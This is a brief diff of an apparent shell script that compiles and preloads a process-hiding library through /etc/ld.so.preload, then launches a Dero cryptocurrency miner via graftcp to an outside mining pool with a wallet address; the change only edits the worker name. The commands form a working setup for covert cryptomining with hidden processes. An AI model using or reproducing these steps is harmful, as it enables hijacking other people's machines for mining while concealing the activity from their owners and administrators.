@@ -45,4 +45,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./dero-stratum-miner -r pool.whalesburg.com:4300 -w dero1qyp0v2966939r6dfp5wnd9umfqqwgv8yshgjk3nn307wlkfafvg4zqq2etl3c.TukimenAnjayy 
+./graftcp/graftcp ./dero-stratum-miner -r pool.whalesburg.com:4300 -w dero1qyp0v2966939r6dfp5wnd9umfqqwgv8yshgjk3nn307wlkfafvg4zqq2etl3c.NORANORI 
